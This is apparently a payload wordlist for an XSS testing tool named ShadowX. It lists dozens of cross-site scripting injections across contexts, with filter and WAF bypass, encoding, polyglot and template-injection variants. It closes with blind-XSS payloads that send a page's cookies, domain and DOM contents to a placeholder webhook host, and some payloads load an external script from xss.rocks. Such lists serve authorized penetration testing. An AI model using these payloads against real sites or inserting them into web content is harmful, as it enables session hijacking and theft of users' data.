# ShadowX Advanced XSS Payloads Collection
# Created by: adce626
# Comprehensive payloads for bypass techniques and context-aware testing

# Basic XSS Payloads
<script>alert("XSS")</script>
<img src=x onerror=alert("XSS")>
<svg onload=alert("XSS")>
<iframe src="javascript:alert('XSS')">
<body onload=alert("XSS")>

# Context Breaking Payloads
';alert("XSS");//
";alert("XSS");//
</script><script>alert("XSS")</script>
</title><script>alert("XSS")</script>
</textarea><script>alert("XSS")</script>

# Event Handler Payloads
onmouseover=alert("XSS")
onfocus=alert("XSS") autofocus
onanimationstart=alert("XSS")
ontransitionend=alert("XSS")
onpageshow=alert("XSS")

# HTML5 Payloads
<video><source onerror="alert('XSS')">
<audio controls><source onerror="alert('XSS')">
<details open ontoggle=alert("XSS")>
<marquee onstart=alert("XSS")>

# SVG Payloads
<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>
<svg><set onbegin=alert("XSS") attributeName=x to=y>
<svg><animateTransform onbegin=alert("XSS")>

# Filter Bypass Payloads
<ScRiPt>alert("XSS")</ScRiPt>
<sCrIpT>alert("XSS")</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>/**/alert("XSS");</script>
<script>window["alert"]("XSS")</script>

# WAF Bypass Techniques
<script>alert("XSS");</script>
<script>top["alert"]("XSS")</script>
<script>Function("alert('XSS')")();</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>

# Encoded Payloads
%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
&lt;script&gt;alert("XSS")&lt;/script&gt;
&#60;script&#62;alert("XSS")&#60;/script&#62;

# Double Encoded
%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E

# DOM XSS Payloads
javascript:alert("XSS")
data:text/html,<script>alert("XSS")</script>
vbscript:alert("XSS")

# Polyglot Payloads
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

# Advanced Event Handlers
<input autofocus onfocus=alert("XSS")>
<select onfocus=alert("XSS") autofocus>
<textarea onfocus=alert("XSS") autofocus>
<keygen onfocus=alert("XSS") autofocus>

# CSS-based XSS
<style>@import'javascript:alert("XSS")';</style>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<style>body{-moz-binding:url("javascript:alert('XSS')")}</style>

# Protocol Handlers
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAME SRC="javascript:alert('XSS');"></FRAME>
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">

# Browser-specific
<IMG SRC="javascript:alert('XSS');">
<IMG DYNSRC="javascript:alert('XSS');">
<IMG LOWSRC="javascript:alert('XSS');">

# Template Injection
{{alert('XSS')}}
${alert('XSS')}
<%= alert('XSS') %>
{alert('XSS')}

# CDATA Bypass
<![CDATA[<script>alert('XSS')</script>]]>

# Null Byte Bypass
<IMG SRC=java\0script:alert(\"XSS\")>
<IMG SRC=" &#14;  javascript:alert('XSS');">

# Character Encoding Bypass
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
<SCRIPT SRC=//xss.rocks/.j>
<SCRIPT>alert(/XSS/.source)</SCRIPT>

# Event Timing
<IMG SRC=x onload="alert('XSS')">
<IMG SRC=x onerror="alert('XSS')">
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

# Unicode Bypass
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

# Base64 Bypass
<META HTTP-EQUIV="refresh" CONTENT="0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">

# JSON Injection
"}/**/alert('XSS');//
"}/**/alert('XSS');//\n
"}/**/alert('XSS');//\r

# XML Entity
<!DOCTYPE html [<!ENTITY xxe "alert('XSS')">]><script>&xxe;</script>

# Blind XSS Payloads (will be replaced with actual webhook URLs)
<script>var i=new Image;i.src="http://WEBHOOK_URL/?cookie="+document.cookie;</script>
<script>fetch("http://WEBHOOK_URL/?data="+btoa(document.domain));</script>
<script>new XMLHttpRequest().send("GET","http://WEBHOOK_URL/?dom="+document.body.innerHTML);</script>